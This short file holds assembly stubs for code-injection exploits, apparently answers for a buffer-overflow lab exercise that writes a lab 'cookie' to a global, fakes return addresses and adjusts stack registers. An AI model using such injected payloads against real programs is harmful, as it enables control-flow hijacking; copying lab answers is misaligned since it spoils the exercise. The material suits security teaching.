# global_value 0x0804d1e8
# cookie 0x4dd9cc21

# mov $0x0804d1e8, %eax
# movl $0x4dd9cc21, (%eax)
# movl $0x08049443, (%esp)
# ret

# push %esp
# push $0x0804950d
# ret

# mov $0x4dd9cc21, %eax
# push $0x804957d
# ret

# mov $0x4dd9cc21, %eax
# lea 0x38(%esp), %ebp
# push $0x80495f7
# ret

mov $0x804d1e8,%eax
movl $0x34646439, (%eax)
movl $0x63633231, 0x4(%eax)
push %eax
subl $0x4,%esp
push $0x804950d
ret

mov $0x55682f1e, %esp
